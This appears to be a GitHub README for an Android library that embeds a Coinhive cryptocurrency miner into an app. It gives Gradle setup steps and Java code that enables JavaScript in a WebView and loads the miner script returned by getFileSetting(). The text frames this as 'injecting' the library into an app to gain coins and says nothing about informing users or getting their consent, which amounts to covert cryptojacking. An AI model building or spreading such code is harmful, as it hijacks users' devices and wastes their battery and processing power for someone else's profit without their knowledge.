# coin-miner-android-library
Android Lib you can integrate it with your application (inject) to gain the Coins

- instalation
```
  allprojects {
		repositories {
			...
			maven { url 'https://jitpack.io' }
		}
	}
```

- dependencies 

```
compile 'com.github.alitarfa:coin-miner-android-library:0.0.1'
```  
- how yo use the library :
 - first make sure to have a API key visite the web site  :coinhive 
 - Use this method to set your API key getFileSetting(key_api);
   this method return a string file you need to save it into attr string  
          
 - you must insert WebView in the Activity with width and height wrap-content
 - in Activity java 
 ```
      WebView wv=findViewById(R.id.webView);
      wv.getSettings().setJavaScriptEnabled(true);      
      String mime = "text/html";
      String encoding = "utf-8";
      Log.e("script",file);
      webView.loadDataWithBaseURL(null, file, mime, encoding, null);
```

the file param is a string returned by the static method getFileSetting() from the class SettingFileCoinMiner

